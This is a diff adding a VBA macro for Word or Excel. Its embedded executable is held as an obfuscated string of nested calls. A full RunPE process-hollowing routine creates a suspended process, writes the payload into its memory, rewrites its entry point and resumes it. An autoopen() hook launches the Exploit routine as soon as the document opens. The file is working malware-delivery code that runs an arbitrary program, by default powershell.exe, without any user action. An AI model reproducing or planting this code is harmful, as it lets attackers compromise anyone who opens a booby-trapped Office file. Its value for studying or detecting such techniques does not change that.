+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+
+    PE5 = strPE
+End Function
+
+Private Function PE() As String
+    Dim strPE As String
+    strPE = ""
+    strPE = strPE + PE0()
+    strPE = strPE + PE1()
+    strPE = strPE + PE2()
+    strPE = strPE + PE3()
+    strPE = strPE + PE4()
+    strPE = strPE + PE5()
+    PE = strPE
+End Function
+' ===== END PE2VBA =====
+
+
+' ================================================================================
+'                                   ~~~ MAIN ~~~
+' ================================================================================
+
+' --------------------------------------------------------------------------------
+' Method:    RunPE
+' Desc:      Main method. Executes a PE from the memory of Word/Excel
+' Arguments: baImage - A Byte array representing a PE file
+'            strArguments - A String representing the command line arguments
+' Returns:   N/A
+' --------------------------------------------------------------------------------
+Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)
+
+    Debug.Print ("[*] Checking source PE...")
+    ' Populate IMAGE_DOS_HEADER structure
+    ' |__ IMAGE_DOS_HEADER size is 64 (0x40)
+    Dim structDOSHeader As IMAGE_DOS_HEADER
+    Dim ptrDOSHeader As LongPtr: ptrDOSHeader = VarPtr(structDOSHeader)
+    Call RtlMoveMemory(ptrDOSHeader, VarPtr(baImage(0)), SIZEOF_IMAGE_DOS_HEADER)
+    
+    
+    ' Check Magic Number (i.e. is it a PE file?)
+    ' |__ Magic number = 0x5A4D or 23117 or 'MZ'
+    If structDOSHeader.e_magic = IMAGE_DOS_SIGNATURE Then
+        If VERBOSE Then
+            Debug.Print ("    |__ Magic number is OK.")
+        End If
+    Else
+        Debug.Print ("    |__ Input file is not a valid PE.")
+        Exit Sub
+    End If
+    
+    
+    ' Populate IMAGE_NT_HEADERS structure
+    ' |__ IMAGE_NT_HEADERS start at offset DOSHeader->e_lfanew
+    ' |__ IMAGE_NT_HEADERS size is 248 (0xf8) (32 bits)
+    ' |__ IMAGE_NT_HEADERS size is 264 (0x108) (64 bits)
+    Dim structNTHeaders As IMAGE_NT_HEADERS
+    Dim ptrNTHeaders As LongPtr: ptrNTHeaders = VarPtr(structNTHeaders)
+    Call RtlMoveMemory(ptrNTHeaders, VarPtr(baImage(structDOSHeader.e_lfanew)), SIZEOF_IMAGE_NT_HEADERS)
+    
+    
+    ' Check NT headers Signature
+    ' |__ NT Header Signature = 'PE00' or 0x00004550 or 17744
+    If structNTHeaders.Signature = IMAGE_NT_SIGNATURE Then
+        If VERBOSE Then
+            Debug.Print ("    |__ NT Header Signature is OK.")
+        End If
+    Else
+        Debug.Print ("    |__ NT Header Signature is not valid.")
+        Exit Sub
+    End If
+    
+    
+    ' Check CPU architecture
+    If VERBOSE Then
+        Debug.Print ("    |__ Machine type: 0x" + Hex(structNTHeaders.FileHeader.Machine))
+    End If
+    #If Win64 Then
+        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_I386 Then
+            Debug.Print ("[-] You're trying to inject a 32 bits binary into a 64 bits process!")
+            Exit Sub
+        End If
+    #Else
+        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64 Then
+            Debug.Print ("[-] You're trying to inject a 64 bits binary into a 32 bits process!")
+            Exit Sub
+        End If
+    #End If
+    
+    
+    ' Get the path of the current process executable
+    Dim strCurrentFilePath As String
+    strCurrentFilePath = Space(MAX_PATH) ' Allocate memory to store the path
+    Dim lGetModuleFileName As Long
+    lGetModuleFileName = GetModuleFileName(0, strCurrentFilePath, MAX_PATH)
+    strCurrentFilePath = Left(strCurrentFilePath, InStr(strCurrentFilePath, vbNullChar) - 1) ' Remove NULL bytes
+    
+    
+    ' Format command line
+    Dim strCmdLine As String
+    strCmdLine = strCurrentFilePath + " " + strArguments
+    
+    
+    ' Create new process in suspended state
+    Debug.Print ("[*] Creating new process in suspended state...")
+    Dim strNull As String
+    Dim structProcessInformation As PROCESS_INFORMATION
+    Dim structStartupInfo As STARTUPINFO
+    If VERBOSE Then
+        Debug.Print ("    |__ Target PE: '" + strCurrentFilePath + "'")
+    End If
+    Dim lCreateProcess As Long
+    lCreateProcess = CreateProcess(strNull, strCurrentFilePath + " " + strArguments, 0&, 0&, False, CREATE_SUSPENDED, 0&, strNull, structStartupInfo, structProcessInformation)
+    If lCreateProcess = 0 Then
+        Debug.Print ("    |__ CreateProcess() failed (Err: " + Str(Err.LastDllError) + ").")
+        Exit Sub
+    Else
+        If VERBOSE Then
+            Debug.Print ("    |__ CreateProcess() OK")
+        End If
+    End If
+    
+    
+    ' Get Thread Context
+    Debug.Print ("[*] Retrieving the context of the main thread...")
+    Dim structContext As CONTEXT
+    structContext.ContextFlags = CONTEXT_INTEGER 'CONTEXT_FULL
+    Dim lGetThreadContext As Long
+    #If Win64 Then
+        Dim baContext(0 To (LenB(structContext) - 1)) As Byte
+        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
+        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
+    #Else
+        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, structContext)
+    #End If
+    If lGetThreadContext = 0 Then
+        Debug.Print ("    |__ GetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    Else
+        #If Win64 Then
+            Call RtlMoveMemory(VarPtr(structContext), VarPtr(baContext(0)), LenB(structContext))
+        #End If
+        If VERBOSE Then
+            Debug.Print ("    |__ GetThreadContext() OK")
+        End If
+    End If
+    
+    
+    ' Get image base of the target process (if we want to unmap it before injecting our PE)
+    ' |__ Image base address is CONTEXT.ebx + 8 (32 bits)
+    ' |__ Image base address is CONTEXT.rdx + 16 (64 bits)
+    'Debug.Print ("[*] Reading target process base image address...")
+    'Dim ptrTargetImageBase As LongPtr
+    'Dim ptrTargetImageBaseLocation As LongPtr
+    '#If Win64 Then
+    '    ptrTargetImageBaseLocation = structContext.Rdx + 16
+    '#Else
+    '    ptrTargetImageBaseLocation = structContext.Ebx + 8
+    '#End If
+    
+    'Dim lReadProcessMemory As Long
+    'lReadProcessMemory = ReadProcessMemory(structProcessInformation.hProcess, ptrTargetImageBaseLocation, VarPtr(ptrTargetImageBase), SIZEOF_ADDRESS, 0)
+    'If lReadProcessMemory = 0 Then
+    '    Debug.Print ("    |__ ReadProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
+    '    Call TerminateProcess(structProcessInformation.hProcess, 0)
+    '    Exit Sub
+    'Else
+    '    If VERBOSE Then
+    '        Debug.Print ("    |__ Target process image base address: Ox" + Hex(ptrTargetImageBase))
+    '    End If
+    'End If
+    
+    
+    ' Unmap target image (optional)
+    ' We don't really need to unmap the current image
+    
+    
+    ' Get Relocation directory and check if the PE has a relocation table
+    ' |__ NTHeaders.OptionalHeader.DataDirectory[5]
+    Dim structRelocDirectory As IMAGE_DATA_DIRECTORY
+    Call RtlMoveMemory(VarPtr(structRelocDirectory), VarPtr(structNTHeaders.OptionalHeader.DataDirectory(IMAGE_DIRECTORY_ENTRY_BASERELOC)), SIZEOF_IMAGE_DATA_DIRECTORY)
+    
+    Dim ptrDesiredImageBase As LongPtr: ptrDesiredImageBase = 0
+    If structRelocDirectory.VirtualAddress = 0 Then
+        Debug.Print ("[!] PE has no relocation table, using default base address: 0x" + Hex(structNTHeaders.OptionalHeader.ImageBase))
+        ptrDesiredImageBase = structNTHeaders.OptionalHeader.ImageBase
+    End If
+    
+
+    ' Allocate memory for the source image in the new process
+    Debug.Print ("[*] Allocating memory for the source image in process with PID" + Str(structProcessInformation.dwProcessId) + "...")
+    If VERBOSE Then
+        Debug.Print ("    |__ PE image size: " + Str(structNTHeaders.OptionalHeader.SizeOfImage))
+    End If
+    Dim ptrProcessImageBase As LongPtr
+    ptrProcessImageBase = VirtualAllocEx(structProcessInformation.hProcess, ptrDesiredImageBase, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    If ptrProcessImageBase = 0 Then
+        Debug.Print ("    |__ VirtualAllocEx() failed (Err:" + Str(Err.LastDllError) + ").")
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    Else
+        If VERBOSE Then
+            Debug.Print ("    |__ VirtualAllocEx() OK - Got Addr: 0x" + Hex(ptrProcessImageBase))
+        End If
+    End If
+    
+    
+    ' Change the image base saved in headers
+    ' |__ IMAGE_NT_HEADERS is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew
+    ' |__ IMAGE_NT_HEADERS = Signature || IMAGE_FILE_HEADER || IMAGE_OPTIONAL_HEADER
+    ' |__ In IMAGE_OPTIONAL_HEADER32, ImageBase is at offset 28
+    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
+    ' |__ In IMAGE_OPTIONAL_HEADER64, ImageBase is at offset 24
+    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
+    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
+        Dim lImageBaseAddrOffset As Long
+        Dim ptrImageBase As LongPtr
+        #If Win64 Then
+            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
+        #Else
+            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
+        #End If
+
+        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value
+        'Debug.Print ("Current image base: 0x" + Hex(ptrImageBase) + " - Image base to write: 0x" + Hex(ptrProcessImageBase))
+        
+        Call RtlMoveMemory(VarPtr(baImage(0 + lImageBaseAddrOffset)), VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS) ' Write new value
+        
+        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value to verify
+        'Debug.Print ("New effective image base: 0x" + Hex(ptrImageBase))
+    End If
+
+
+    ' Allocate some memory in the current process to store the source image
+    Debug.Print ("[*] Allocating memory for the source image in current process...")
+    Dim ptrImageLocalCopy As LongPtr
+    ptrImageLocalCopy = VirtualAlloc(0&, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    If ptrImageLocalCopy = 0 Then
+        Debug.Print ("    |__ VirtualAlloc() failed (Err:" + Str(Err.LastDllError) + ").")
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    Else
+        If VERBOSE Then
+            Debug.Print ("    |__ VirtualAlloc() OK - Got Addr: 0x" + Hex(ptrImageLocalCopy))
+        End If
+    End If
+    
+    
+    ' Copy source image to local memory
+    Debug.Print ("[*] Writing source image in current process...")
+    If VERBOSE Then
+        Debug.Print ("    |__ Target address: 0x" + Hex(ptrImageLocalCopy))
+
+        Debug.Print ("[*] Writing PE headers...")
+        Debug.Print ("    |__ Headers size:" + Str(structNTHeaders.OptionalHeader.SizeOfHeaders))
+    End If
+    Call RtlMoveMemory(ptrImageLocalCopy, VarPtr(baImage(0)), structNTHeaders.OptionalHeader.SizeOfHeaders)
+    
+    If VERBOSE Then
+        Debug.Print ("[*] Writing PE sections...")
+    End If
+    Dim iCount As Integer
+    Dim structSectionHeader As IMAGE_SECTION_HEADER
+    For iCount = 0 To (structNTHeaders.FileHeader.NumberOfSections - 1)
+        ' Nth section is at offset:
+        '  0 (image base)
+        '  + DOSHeader->e_lfanew  Image base address
+        '  + 248 OR 264           IMAGE_NT_HEADERS size is 248 (32 bits) or 264 (64 bits)
+        '  + N * 40               IMAGE_SECTION_HEADER is 40 (32 & 64 bits)
+        Call RtlMoveMemory(VarPtr(structSectionHeader), VarPtr(baImage(structDOSHeader.e_lfanew + SIZEOF_IMAGE_NT_HEADERS + (iCount * SIZEOF_IMAGE_SECTION_HEADER))), SIZEOF_IMAGE_SECTION_HEADER)
+        
+        Dim strSectionName As String: strSectionName = ByteArrayToString(structSectionHeader.SecName)
+        Dim ptrNewAddress As LongPtr: ptrNewAddress = ptrImageLocalCopy + structSectionHeader.VirtualAddress
+        Dim lSize As Long: lSize = structSectionHeader.SizeOfRawData
+        
+        If VERBOSE Then
+            Debug.Print ("    |__ Writing section: '" + strSectionName + "' (Size:" + Str(lSize) + ") at 0x" + Hex(ptrNewAddress))
+        End If
+
+        Call RtlMoveMemory(ptrNewAddress, VarPtr(baImage(0 + structSectionHeader.PointerToRawData)), lSize)
+    Next iCount
+    
+
+    ' If the base address of the payload changed, we need to apply relocations
+    Debug.Print ("[*] Applying relocations...")
+    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
+        
+        Dim lMaxSize As Long: lMaxSize = structRelocDirectory.Size
+        Dim lRelocAddr As Long: lRelocAddr = structRelocDirectory.VirtualAddress
+        
+        Dim structReloc As IMAGE_BASE_RELOCATION
+        Dim lParsedSize As Long: lParsedSize = 0
+        
+        Do While lParsedSize < lMaxSize
+        
+            Dim ptrStructReloc As LongPtr: ptrStructReloc = ptrImageLocalCopy + lRelocAddr + lParsedSize
+            Call RtlMoveMemory(VarPtr(structReloc), ptrStructReloc, SIZEOF_IMAGE_BASE_RELOCATION)
+            lParsedSize = lParsedSize + structReloc.SizeOfBlock
+            
+            If (structReloc.VirtualAddress <> 0) And (structReloc.SizeOfBlock <> 0) Then
+                If VERBOSE Then
+                    Debug.Print ("    |__ Relocation Block: Addr=0x" + Hex(structReloc.VirtualAddress) + " - Size:" + Str(structReloc.SizeOfBlock))
+                End If
+                
+                Dim lEntriesNum As Long: lEntriesNum = (structReloc.SizeOfBlock - SIZEOF_IMAGE_BASE_RELOCATION) / SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
+                Dim lPage As Long: lPage = structReloc.VirtualAddress
+                
+                Dim ptrBlock As LongPtr: ptrBlock = ptrStructReloc + SIZEOF_IMAGE_BASE_RELOCATION
+                Dim iBlock As Integer
+                Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
+                
+                iCount = 0
+                For iCount = 0 To (lEntriesNum - 1)
+                    Dim iBlockType As Integer: iBlockType = ((iBlock And &HF000) / &H1000) And &HF ' type = value >> 12
+                    Dim iBlockOffset As Integer: iBlockOffset = iBlock And &HFFF ' offset = value & 0xfff
+                    'Debug.Print ("    |   |__ Block: Type=" + Str(iBlockType) + " - Offset=0x" + Hex(iBlockOffset))
+                    
+                    If iBlockType = 0 Then
+                        Exit For
+                    End If
+
+                    Dim iPtrSize As Integer: iPtrSize = 0
+                    If iBlockType = &H3 Then ' 32 bits address
+                        iPtrSize = 4
+                    ElseIf iBlockType = &HA Then ' 64 bits address
+                        iPtrSize = 8
+                    End If
+                    
+                    Dim ptrRelocateAddr As LongPtr
+                    ptrRelocateAddr = ptrImageLocalCopy + lPage + iBlockOffset
+
+                    If iPtrSize <> 0 Then
+                        Dim ptrRelocate As LongPtr
+                        Call RtlMoveMemory(VarPtr(ptrRelocate), ptrRelocateAddr, iPtrSize)
+                        ptrRelocate = ptrRelocate - structNTHeaders.OptionalHeader.ImageBase + ptrProcessImageBase
+                        Call RtlMoveMemory(ptrRelocateAddr, VarPtr(ptrRelocate), iPtrSize)
+                    End If
+                    
+                    ptrBlock = ptrBlock + SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
+                    Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
+                    
+                Next iCount
+            End If
+        Loop
+    End If
+    
+    
+    ' Write modified image to target process memory
+    Debug.Print ("[*] Writing modified source image to target process memory...")
+    Dim lWriteProcessMemory As Long
+    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrProcessImageBase, ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, 0&)
+    If lWriteProcessMemory = 0 Then
+        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    Else
+        If VERBOSE Then
+            Debug.Print ("    |__ WriteProcessMemory() OK")
+        End If
+    End If
+    
+    
+    ' Free local memory
+    Call VirtualFree(ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, &H10000) ' &H10000 = MEM_FREE
+    
+    
+    ' Applying new image base address to target PEB
+    Debug.Print ("[*] Applying new image base address to target PEB...")
+    Dim ptrPEBImageBaseAddr As LongPtr
+    #If Win64 Then
+        ptrPEBImageBaseAddr = structContext.Rdx + 16
+    #Else
+        ptrPEBImageBaseAddr = structContext.Ebx + 8
+    #End If
+    
+    If VERBOSE Then
+        Debug.Print ("    |__ Image base address location: 0x" + Hex(ptrPEBImageBaseAddr))
+        Debug.Print ("    |__ Image base address: 0x" + Hex(ptrProcessImageBase))
+    End If
+    
+    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrPEBImageBaseAddr, VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS, 0&)
+    If lWriteProcessMemory = 0 Then
+        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    Else
+        If VERBOSE Then
+            Debug.Print ("    |__ WriteProcessMemory() OK")
+        End If
+    End If
+    
+    
+    ' Overwrite context with new entry point
+    Debug.Print ("[*] Overwriting context with new entry point...")
+    Dim ptrEntryPoint As LongPtr: ptrEntryPoint = ptrProcessImageBase + structNTHeaders.OptionalHeader.AddressOfEntryPoint
+    #If Win64 Then
+        structContext.Rcx = ptrEntryPoint
+    #Else
+        structContext.Eax = ptrEntryPoint
+    #End If
+    
+    If VERBOSE Then
+        Debug.Print ("    |__ New entry point: 0x" + Hex(ptrEntryPoint))
+    End If
+    
+    Dim lSetThreadContext As Long
+    #If Win64 Then
+        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
+        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
+    #Else
+        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, structContext)
+    #End If
+    If lSetThreadContext = 0 Then
+        Debug.Print ("    |__ SetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    Else
+        If VERBOSE Then
+            Debug.Print ("    |__ SetThreadContext() OK")
+        End If
+    End If
+    
+    
+    ' Resume thread
+    ' |__ If ResumeThread succeeds, the return value is the thread's previous suspend count (i.e. 1 in this case)
+    Debug.Print ("[*] Resuming suspended process...")
+    Dim lResumeThread As Long
+    lResumeThread = ResumeThread(structProcessInformation.hThread)
+    If lResumeThread = 1 Then
+        If VERBOSE Then
+            Debug.Print ("    |__ ResumeThread() OK")
+        End If
+    Else
+        Debug.Print ("    |__ ResumeThread() failed (Err:" + Str(Err.LastDllError) + ")")
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    End If
+
+    Debug.Print ("[+] RunPE complete!!!")
+    
+End Sub
+
+' --------------------------------------------------------------------------------
+' Method:    Exploit
+' Desc:      Calls FileToByteArray to get the content of a PE file as a Byte
+'               array and calls the RunPE procedure to execute it from the memory
+'               of Word / Excel
+' Arguments: N/A
+' Returns:   N/A
+' --------------------------------------------------------------------------------
+Public Sub Exploit()
+
+    Debug.Print ("================================================================================")
+    
+    Dim strSrcFile As String
+    Dim baSrcFileContent() As Byte
+    Dim strSrcArguments As String
+    Dim strSrcPE As String
+    
+    'strSrcFile = "C:\Windows\System32\cmd.exe"
+    strSrcFile = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+    
+    'strSrcFile = "C:\Windows\SysWOW64\cmd.exe"
+    'strSrcFile = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
+    
+    strSrcArguments = ""
+    'strSrcArguments = "-exec Bypass"
+    
+    strSrcPE = PE()
+    If strSrcPE = "" Then
+        If Dir(strSrcFile) = "" Then
+            Debug.Print ("[-] '" + strSrcFile + "' doesn't exist.")
+            Exit Sub
+        Else
+            Debug.Print ("[*] Source file: '" + strSrcFile + "'")
+            If VERBOSE Then
+                Debug.Print ("    |__ Command line: " + strSrcFile + " " + strSrcArguments)
+            End If
+        End If
+        baSrcFileContent = FileToByteArray(strSrcFile)
+        Call RunPE(baSrcFileContent, strSrcArguments)
+    Else
+        Debug.Print ("[+] Source file: embedded PE")
+        baSrcFileContent = StringToByteArray(strSrcPE)
+        Call RunPE(baSrcFileContent, strSrcArguments)
+    End If
+
+End Sub
+
+Sub autoopen()
+    Call Exploit
+End Sub
